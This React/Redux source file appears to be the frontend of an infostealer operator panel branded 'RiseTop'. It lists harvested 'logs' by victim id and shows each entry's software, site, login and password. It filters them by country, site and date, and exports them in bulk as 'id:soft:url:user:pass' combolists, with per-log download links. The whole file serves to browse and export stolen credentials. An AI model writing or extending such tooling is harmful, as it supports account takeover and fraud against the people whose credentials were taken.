import React, { useEffect, useState } from 'react';
import ReactPaginate from 'react-paginate';
import DateRangePicker from 'react-bootstrap-daterangepicker';

import languagesTranslate from '../../common/languages'

import { connect } from 'react-redux';
import { getOwnAllPasswords, changeAllPasswordsFilter } from '../../store/actions/logs.actions'
import { baseUrl } from '../../common/config';
import { parseDate } from '../../common/utils';

export default connect((s) => ({
  user: s.user.state,
  allPasswords: s.logs.passwords,
}), {
  getOwnAllPasswords,
  changeAllPasswordsFilter
})(
  ({
    CurrentLanguage_G,

    user,
    allPasswords,

    getOwnAllPasswords,
    changeAllPasswordsFilter
  }) => {
    const [CurrentPage, changeCurrentPage] = useState(1)
    const [Passwords, changePasswords] = useState([])
    const [Pattern, changePattern] = useState('{id}:{soft}:{url}:{user}:{pass}')

    const handlePageChange = (page) => {

      changeCurrentPage(page);

      if (allPasswords.state.length != allPasswords.all && CurrentPage == (Passwords.length / 50) - 1)
        getOwnAllPasswords({
          ...allPasswords.filter,
          token: user.token,
          from: allPasswords.state.length
        })

    }

    useEffect(() => {
      let _allPasswords = [];

      for (let i = 0; i < allPasswords.state.length; i++)
        _allPasswords = [..._allPasswords, ...allPasswords.state[i].passwords.map(v => ({ id: allPasswords.state[i].id, value: v }))]

      if (allPasswords.filter.site)
        _allPasswords = _allPasswords.filter(v => v.value.host == allPasswords.filter.site);

      if (allPasswords.filter.login)
        _allPasswords = _allPasswords.filter(v => v.value.login == allPasswords.filter.login);

      if (allPasswords.filter.emptyLogin)
        _allPasswords = _allPasswords.filter(v => !v.value.login);

      if (allPasswords.filter.emptyPassword)
        _allPasswords = _allPasswords.filter(v => !v.value.password);

      changePasswords(_allPasswords)

    }, [allPasswords.state])

    useEffect(() => {
      getOwnAllPasswords({
        ...allPasswords.filter,
        country: allPasswords.filter.country == 'all' ? '' : allPasswords.filter.country,
        token: user.token
      })
    }, [allPasswords.filter])

    return (
      <section className="content">
        <div className="body_scroll">
          <div className="block-header">
            <div className="row">
              <div className="col-lg-7 col-md-6 col-sm-12">
                <h2>{languagesTranslate[CurrentLanguage_G].allPasswordsPage.header}</h2>
                <ul className="breadcrumb">
                  <li className="breadcrumb-item"><a href="index.html"><i className="zmdi zmdi-home"></i> RiseTop</a>
                  </li>
                  <li className="breadcrumb-item">{languagesTranslate[CurrentLanguage_G].allPasswordsPage.pathItem1}</li>
                  <li className="breadcrumb-item active">{languagesTranslate[CurrentLanguage_G].allPasswordsPage.pathItem2}</li>
                </ul>
                <button className="btn btn-primary btn-icon mobile_menu" type="button"><i
                  className="zmdi zmdi-sort-amount-desc"></i></button>
              </div>
            </div>
          </div>

          <div class="container-fluid">
            <div class="row clearfix">
              <div class="col-lg-12 col-md-12">
                <div class="card">
                  <div class="header">
                    <h2><strong>{languagesTranslate[CurrentLanguage_G].allPasswordsPage.passwords}</strong></h2>
                  </div>
                  <div class="body">
                    <div class="row mb-2">
                      <div class="col-lg-2 pr-1 col-md-4">
                        <div class="form-group">
                          <input type="text" class="form-control" placeholder={languagesTranslate[CurrentLanguage_G].allPasswordsPage.id} value={allPasswords.filter.id} onChange={e => changeAllPasswordsFilter({ name: 'id', value: e.target.value })} />
                        </div>
                      </div>
                      <div class="col-lg-2 pr-1 pl-1 col-md-12">
                        <div class="form-group">
                          <select class="custom-select" value={allPasswords.filter.country} onChange={e => changeAllPasswordsFilter({ name: 'country', value: e.target.value })}>
                            <option value={'all'}>{languagesTranslate[CurrentLanguage_G].allPasswordsPage.allCountries}</option>
                            <option value={'US'}>US</option>
                            <option value={'RU'}>RU</option>
                            <option value={'KZ'}>KZ</option>
                          </select>
                        </div>
                      </div>
                      <div class="col-lg-2 pr-1 pl-1 col-md-4">
                        <div class="form-group">
                          <input type="text" class="form-control" placeholder={languagesTranslate[CurrentLanguage_G].allPasswordsPage.site} value={allPasswords.filter.site} onChange={e => changeAllPasswordsFilter({ name: 'site', value: e.target.value })} />
                        </div>
                      </div>
                      <div class="col-lg-2 pr-1 pl-1 col-md-4">
                        <div class="form-group">
                          <input type="text" class="form-control" placeholder={languagesTranslate[CurrentLanguage_G].allPasswordsPage.login} value={allPasswords.filter.login} onChange={e => changeAllPasswordsFilter({ name: 'login', value: e.target.value })} />
                        </div>
                      </div>
                      <div class="col-lg-1 pr-1 pl-1 col-md-0" />
                      <div class="col-lg-3 pr-1 pl-1 col-md-0">
                        <div className="d-flex justify-content-end w-100">
                          <div class="form-group w-100">
                            <input type="text" class="form-control" placeholder="{id}:{soft}:{url}:{user}:{pass}" value={Pattern} onChange={e => changePattern(e.target.value)} />
                          </div>
                          <a href={`${baseUrl}logs/download-passwords?_id=${user._id}&id=${allPasswords.filter.id}&country=${allPasswords.filter.country == 'all' ? '' : allPasswords.filter.country}&site=${allPasswords.filter.site}&login=${allPasswords.filter.login}&dateFrom=${allPasswords.filter.dateFrom}&dateTo=${allPasswords.filter.dateTo}&emptyLogin=${allPasswords.filter.emptyLogin}&emptyPassword=${allPasswords.filter.emptyPassword}&pattern=${Pattern}`} download className={'mb-3'}>
                            <button type="button" class="btn btn-primary mt-0 mb-0 h-100">
                              <span class="btn-label">
                                <i class="zmdi zmdi-download"></i>
                              </span>
                            </button>
                          </a>
                        </div>
                      </div>
                      <div class="col-lg-3 pr-1 col-md-12">
                        <DateRangePicker
                          initialSettings={{ startDate: allPasswords.filter.dateFrom ? new Date(allPasswords.filter.dateFrom) : new Date(), endDate: allPasswords.filter.dateTo ? new Date(allPasswords.filter.dateTo) : new Date() }}
                          onApply={(event, { startDate, endDate }) => {
                            changeAllPasswordsFilter({ name: 'dateFrom', value: startDate.toDate() })
                            changeAllPasswordsFilter({ name: 'dateTo', value: endDate.toDate() })
                          }}
                        >
                          <div>
                            <div class="input-group">
                              <div class="input-group-prepend">
                                <span class="input-group-text" id="">{languagesTranslate[CurrentLanguage_G].WorkersLogsPage.date}</span>
                              </div>
                              <input type="text" class="form-control" readOnly value={parseDate(allPasswords.filter.dateFrom)} />
                              <input type="text" class="form-control" readOnly value={parseDate(allPasswords.filter.dateTo)} />
                            </div>
                          </div>
                        </DateRangePicker>
                      </div>
                      <div class="col-lg-8 pr-1 col-md-4">
                        <div class="form-check form-check-inline">
                          <input class="form-check-input" type="checkbox" id="inlineCheckbox1" value="option1" checked={allPasswords.filter.emptyLogin} onChange={e => changeAllPasswordsFilter({ name: 'emptyLogin', value: e.target.checked ? true : '' })} />
                          <label class="form-check-label" for="inlineCheckbox1">{languagesTranslate[CurrentLanguage_G].allPasswordsPage.emptyLogins}</label>
                        </div>
                        <br />
                        <div class="form-check form-check-inline">
                          <input class="form-check-input" type="checkbox" id="inlineCheckbox2" value="option1" checked={allPasswords.filter.emptyPassword} onChange={e => changeAllPasswordsFilter({ name: 'emptyPassword', value: e.target.checked ? true : '' })} />
                          <label class="form-check-label" for="inlineCheckbox2">{languagesTranslate[CurrentLanguage_G].allPasswordsPage.emptyPasswords}</label>
                        </div>
                      </div>
                    </div>
                    <div className="row">
                      <div className="col-6">
                        <div className="w-100 h-100 d-flex align-items-center">
                          <span className={'text-muted'}>{languagesTranslate[CurrentLanguage_G].allPasswordsPage.show(((CurrentPage - 1) * 50) + 1, CurrentPage * 50, Passwords.length)}</span>
                        </div>
                      </div>
                      <div className="col-6">
                        <ReactPaginate
                          previousLinkClassName={'btn btn-secondary previous'}
                          previousLabel={languagesTranslate[CurrentLanguage_G].WorkersLogsPage.previous}
                          nextLinkClassName={'btn btn-secondary next'}
                          nextLabel={languagesTranslate[CurrentLanguage_G].WorkersLogsPage.next}
                          breakLabel={'...'}
                          breakClassName={'break-me'}
                          pageCount={Math.ceil(Passwords.length / 50)}
                          marginPagesDisplayed={2}
                          pageRangeDisplayed={5}
                          onPageChange={(page) => handlePageChange(page.selected + 1)}
                          containerClassName={'pagination justify-content-end'}
                          activeClassName={'active'}
                          pageLinkClassName={'num'}
                        />
                      </div>
                    </div>
                    <table class="table table-bordered">
                      <thead>
                        <tr>
                          <th>{languagesTranslate[CurrentLanguage_G].allPasswordsPage.id}</th>
                          <th>{languagesTranslate[CurrentLanguage_G].allPasswordsPage.soft}</th>
                          <th>{languagesTranslate[CurrentLanguage_G].allPasswordsPage.url}</th>
                          <th>{languagesTranslate[CurrentLanguage_G].allPasswordsPage.login}</th>
                          <th>{languagesTranslate[CurrentLanguage_G].allPasswordsPage.password}</th>
                        </tr>
                      </thead>
                      <tbody>
                        {
                          Passwords.map((v, i) =>
                            i < CurrentPage * 50 && i >= (CurrentPage - 1) * 50
                              ? <tr key={i}>
                                <th scope="row" className={"text-center"}>
                                  <a href={`${baseUrl}logs/download-log?_id=${user._id}&id=${v.id}`}>
                                    <button class="btn btn-primary">
                                      <span class="btn-label">
                                        <i class="zmdi zmdi-download"></i>
                                      </span>
                                    </button>
                                  </a>
                                  <span>{v.id}</span>
                                </th>
                                <td className={'text-center'}>
                                  {v.value.soft}
                                </td >
                                <td style={{ maxWidth: '200px' }} className={'text-center'}>
                                  {v.value.host}
                                </td >
                                <td className={'text-center'}>
                                  {v.value.login}
                                </td >
                                <td className={'text-center'}>
                                  {v.value.password}
                                </td >
                              </tr>
                              : null
                          )
                        }
                      </tbody>
                    </table>
                  </div>
                </div>
              </div>
            </div>
          </div>

        </div>
      </section >
    )

  }
);